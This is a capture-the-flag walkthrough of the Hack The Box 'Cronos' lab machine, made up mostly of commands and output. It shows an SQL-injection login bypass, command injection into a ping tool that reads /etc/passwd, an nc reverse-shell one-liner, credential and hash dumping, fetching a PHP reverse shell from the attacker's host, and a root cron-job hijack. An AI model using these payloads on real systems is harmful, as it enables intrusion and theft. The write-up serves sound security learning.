# cronos: https://app.hackthebox.com/machines/Cronos

```bash
nmap -sC -sV 10.10.10.13   

Nmap scan report for 10.10.10.13
Host is up (0.086s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 18b973826f26c7788f1b3988d802cee8 (RSA)
|   256 1ae606a6050bbb4192b028bf7fe5963b (ECDSA)
|_  256 1a0ee7ba00cc020104cda3a93f5e2220 (ED25519)
53/tcp open  domain  ISC BIND 9.10.3-P4 (Ubuntu Linux)
| dns-nsid: 
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

```bash
dig -x 10.10.10.13 @10.10.10.13

; <<>> DiG 9.18.12-1-Debian <<>> -x 10.10.10.13 @10.10.10.13
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 49837
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 1, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;13.10.10.10.in-addr.arpa.	IN	PTR

;; ANSWER SECTION:
13.10.10.10.in-addr.arpa. 604800 IN	PTR	ns1.cronos.htb.

;; AUTHORITY SECTION:
10.10.10.in-addr.arpa.	604800	IN	NS	ns1.cronos.htb.

;; ADDITIONAL SECTION:
ns1.cronos.htb.		604800	IN	A	10.10.10.13

;; Query time: 80 msec
;; SERVER: 10.10.10.13#53(10.10.10.13) (UDP)
;; WHEN: Sat Apr 15 17:19:09 EDT 2023
;; MSG SIZE  rcvd: 111

```

```bash
cat /etc/hosts | grep 10.10.10.13
10.10.10.13	ns1.cronos.htb cronos.htb
```

```bash
dig ANY @10.10.10.13 cronos.htb

; <<>> DiG 9.18.12-1-Debian <<>> ANY @10.10.10.13 cronos.htb
; (1 server found)
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 26753
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 3, AUTHORITY: 0, ADDITIONAL: 2

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;cronos.htb.			IN	ANY

;; ANSWER SECTION:
cronos.htb.		604800	IN	SOA	cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800
cronos.htb.		604800	IN	NS	ns1.cronos.htb.
cronos.htb.		604800	IN	A	10.10.10.13

```

```bash
cat /etc/hosts | grep 10.10.10.13
10.10.10.13	ns1.cronos.htb cronos.htb admin.cronos.htb
```

```bash
http://admin.cronos.htb

Username: ' or 2=2 #
Password: ' or 2=2 #
```
```bash
#Net Tool v0.1
8.8.8.8;cat /etc/passwd

PING 8.8.8.8 (8.8.8.8) 56(84) bytes of data.

--- 8.8.8.8 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/bin/bash
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
noulis:x:1000:1000:Noulis Panoulis,,,:/home/noulis:/bin/bash
bind:x:112:119::/var/cache/bind:/bin/false
```

```bash
#Net Tool v0.1
8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.14.13 9999 >/tmp/f

nc -lvnp 9999                     
listening on [any] 9999 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.13] 40554
bash: cannot set terminal process group (1325): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cronos:/var/www/admin$ 

python3 -c "import pty;pty.spawn('/bin/bash')"
```

```bash
www-data@cronos:/var/www/admin$ cat config.php
cat config.php
<?php
   define('DB_SERVER', 'localhost');
   define('DB_USERNAME', 'admin');
   define('DB_PASSWORD', 'kEjdbRigfBHUREiNSDs');
   define('DB_DATABASE', 'admin');
   $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE);
?>

```
```bash
www-data@cronos:/home/noulis$ cat user.txt
cat user.txt
b00906c81040c21059b4498e56a8e7e4
```

```bash
www-data@cronos:/var/www/laravel/config$ mysql -u admin -p
mysql -u admin -p
Enter password: kEjdbRigfBHUREiNSDs

Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 53
Server version: 5.7.17-0ubuntu0.16.04.2 (Ubuntu)

Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.
mysql> show databases;
show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| admin              |
+--------------------+
2 rows in set (0.00 sec)

mysql> use admin;
use admin;
Database changed

mysql> show tables;
show tables;
+-----------------+
| Tables_in_admin |
+-----------------+
| users           |
+-----------------+
1 row in set (0.00 sec)

mysql> select * from users
select * from users
    -> ;
;
+----+----------+----------------------------------+
| id | username | password                         |
+----+----------+----------------------------------+
|  1 | admin    | 4f5fffa7b2340178a716e3832451e058 |
+----+----------+----------------------------------+
1 row in set (0.00 sec)

#it did not work
```

```bash
ls linpeas.sh        
linpeas.sh

python -m http.server 9998
Serving HTTP on 0.0.0.0 port 9998 (http://0.0.0.0:9998/) ...
```

```bash
www-data@cronos:/tmp$ wget 10.10.14.13:9998/linpeas.sh
wget 10.10.14.13:9998/linpeas.sh

Connecting to 10.10.14.13:9998... connected.
HTTP request sent, awaiting response... 200 OK
Length: 827827 (808K) [text/x-sh]
Saving to: 'linpeas.sh'

linpeas.sh          100%[===================>] 808.42K   535KB/s    in 1.5s    

2023-04-16 00:55:12 (535 KB/s) - 'linpeas.sh' saved [827827/827827]

www-data@cronos:/tmp$ chmod 777 linpeas.sh
chmod 777 linpeas.sh
```

```bash
* * * * *	root	php /var/www/laravel/artisan schedule:run >> /dev/null 2>&1

ls -l /var/www/laravel/artisan
ls -l /var/www/laravel/artisan
-rw-r--r-- 1 www-data www-data 9287 Apr 16 01:42 /var/www/laravel/artisan
```

```bash
wget 10.10.14.13:9998/php-reverse.php

Connecting to 10.10.14.13:9998... connected.
HTTP request sent, awaiting response... 200 OK
Length: 9287 (9.1K) [application/octet-stream]
Saving to: 'php-reverse.php'

     0K .........                                             100% 4.85M=0.002s

2023-04-16 01:43:39 (4.85 MB/s) - 'php-reverse.php' saved [9287/9287]

www-data@cronos:/tmp$ mv php-reverse.php artisan

www-data@cronos:/tmp$ mv artisan /var/www/laravel/artisan
```

```bash
nc -lvnp 9997
listening on [any] 9997 ...
connect to [10.10.14.13] from (UNKNOWN) [10.10.10.13] 39978
SOCKET: Shell has connected! PID: 1586

id
uid=0(root) gid=0(root) groups=0(root)
cat /root/root.txt
06f53a97e33fa56d3af7bbed20573656
```

***References*** <br> 
<https://www.revshells.com> <br> 
